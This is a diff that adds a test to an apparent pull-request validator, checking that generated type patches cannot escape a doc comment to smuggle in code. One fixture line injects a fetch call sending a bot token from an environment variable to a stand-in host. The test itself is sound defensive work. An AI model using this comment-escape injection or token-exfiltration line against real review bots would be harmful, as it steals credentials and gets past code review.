@@ -112,6 +112,26 @@ test('generated types may only gain doc comments and optional fields', () => {
   assert.equal(generatedAddsOnly(undefined), false, 'GitHub omitted the patch')
 })
 
+// The patterns carry no lexer state, so a body line that closes the doc
+// comment and reopens it would otherwise match three times over and leave a
+// statement at module scope.
+test('a doc-comment body may not close the comment', () => {
+  const escape = [
+    '@@ -1,2 +1,6 @@',
+    ' export interface A {',
+    '+  /**',
+    '+   * Heading. ' + '*' + '/ fetch("https://e.example/" + process.env.SYDEVS_BOT_PAT); /' + '*',
+    '+   */',
+    '+  browse?: string;',
+    ' }',
+  ].join('\n')
+  assert.equal(generatedAddsOnly(escape), false, 'the three-line escape')
+  assert.equal(generatedAddsOnly('@@\n+   * x ' + '*' + '/ process.exit(1); /' + '*'), false, 'the one-line escape')
+  assert.equal(generatedAddsOnly('@@\n+  /' + '** x ' + '*' + '/ code();'), false, 'an opener carrying code')
+  // A delimiter alone on its line is what a real doc comment is made of.
+  assert.equal(generatedAddsOnly(TYPES_PATCH), true, 'the real patch still passes')
+})
+
 test('a PR is refused for a file outside the rules, an added or renamed file, no key, or no rules', () => {
   const no = (fs, c = contents(), repo = 'SahajCloud') => translationVerdict(config, repo, fs, c).ok
   assert.equal(no(files([{ filename: 'src/lib/thing.ts', status: 'modified', patch: '+x' }])), false)
